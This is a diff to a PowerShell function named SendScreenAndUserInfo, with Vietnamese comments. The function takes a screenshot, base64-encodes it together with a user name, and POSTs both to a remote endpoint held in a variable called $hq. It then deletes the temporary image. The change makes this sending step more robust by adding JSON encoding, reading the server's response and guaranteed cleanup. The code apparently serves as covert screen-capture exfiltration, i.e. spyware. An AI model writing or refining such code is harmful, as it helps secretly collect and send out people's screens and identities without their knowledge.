@@ -26,21 +26,24 @@ function SendScreenAndUserInfo {
     $bitmap.Dispose()
 
     # Chuẩn bị nội dung để gửi
-    $fileContent = [System.IO.File]::ReadAllBytes($screenshotPath)
-    $encodedScreenshot = [Convert]::ToBase64String($fileContent)
-    $body = @{
-        name = $name
-        screenshot = $encodedScreenshot
-    }
-
-    # Gửi thông tin qua POST request
     try {
-        Invoke-WebRequest -Uri $hq -Method POST -Body $body -ContentType "application/json"
-        Write-Host "Thông tin đã được gửi thành công."
+        $fileContent = [System.IO.File]::ReadAllBytes($screenshotPath)
+        $encodedScreenshot = [Convert]::ToBase64String($fileContent)
+        $body = @{
+            name = $name
+            screenshot = $encodedScreenshot
+        } | ConvertTo-Json -Depth 10
+
+        # Gửi thông tin qua POST request
+        $response = Invoke-RestMethod -Uri $hq -Method POST -Body $body -ContentType "application/json"
+        Write-Host "Thông tin đã được gửi thành công. Phản hồi từ server:"
+        Write-Host $response
     } catch {
         Write-Host "Lỗi khi gửi thông tin: $_"
+    } finally {
+        # Xóa file tạm
+        if (Test-Path -Path $screenshotPath) {
+            Remove-Item -Path $screenshotPath -Force
+        }
     }
-
-    # Xóa file tạm
-    Remove-Item -Path $screenshotPath -Force
 }
